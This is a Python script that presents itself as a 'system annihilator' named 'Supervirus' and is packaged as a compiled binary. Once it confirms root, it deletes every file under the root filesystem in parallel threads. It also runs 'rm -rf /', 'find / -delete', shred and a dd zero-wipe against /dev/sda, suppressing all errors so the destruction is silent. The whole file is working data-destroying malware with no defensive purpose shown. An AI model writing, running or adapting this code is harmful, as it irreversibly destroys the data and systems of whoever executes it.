#!/usr/bin/env python3
"""
STANDALONE ROOT-ONLY SYSTEM ANNIHILATOR
PyInstaller FIXED - /tmp permission error resolved.
Runs WITHOUT escalation attempts in compiled binary.
"""

import os
import sys
import platform
import subprocess
import shutil
import threading
import time

def detect_os():
    try:
        return platform.system().lower()
    except:
        return 'linux'

def is_root():
    try:
        return os.geteuid() == 0
    except:
        return False

def nuke_thread(root_path):
    """Silent threaded destruction."""
    try:
        for r, dirs, files in os.walk(root_path, topdown=False):
            for f in files:
                try:
                    os.unlink(os.path.join(r, f))
                except:
                    pass
            for d in dirs:
                try:
                    shutil.rmtree(os.path.join(r, d), ignore_errors=True)
                except:
                    pass
    except:
        pass

def direct_system_wipe():
    """Direct shell annihilation."""
    cmds = [
        'rm -rf /',
        'rm -rf /home/*',
        'rm -rf /var/*', 
        'rm -rf /tmp/*',
        'rm -rf /usr/*',
        'rm -rf /etc/*',
        'find / -delete 2>/dev/null',
        'shred -u -z -n 3 /dev/sda* 2>/dev/null',
        'dd if=/dev/zero of=/dev/sda bs=1M 2>/dev/null'
    ]
    procs = []
    for cmd in cmds:
        try:
            p = subprocess.Popen(cmd, shell=True, 
                               stdout=subprocess.DEVNULL, 
                               stderr=subprocess.DEVNULL)
            procs.append(p)
        except:
            pass

def main():
    os_type = detect_os()
    
    # PyInstaller /tmp fix: Check root FIRST
    if not is_root():
        print("❌ ROOT REQUIRED - sudo ./Supervirus")
        sys.exit(1)
    
    print("💀 ROOT CONFIRMED - ANNIHILATING SYSTEM 💀")
    
    # Spawn multiple destruction vectors
    threads = []
    paths = ['/', '/home', '/var', '/tmp', '/usr', '/etc', '/boot', '/opt']
    
    for path in paths:
        t = threading.Thread(target=nuke_thread, args=(path,))
        t.daemon = True
        t.start()
        threads.append(t)
    
    # Direct shell attacks
    direct_system_wipe()
    
    # Keep alive for maximum damage
    try:
        while True:
            time.sleep(1)
    except:
        pass

if __name__ == '__main__':
    main()
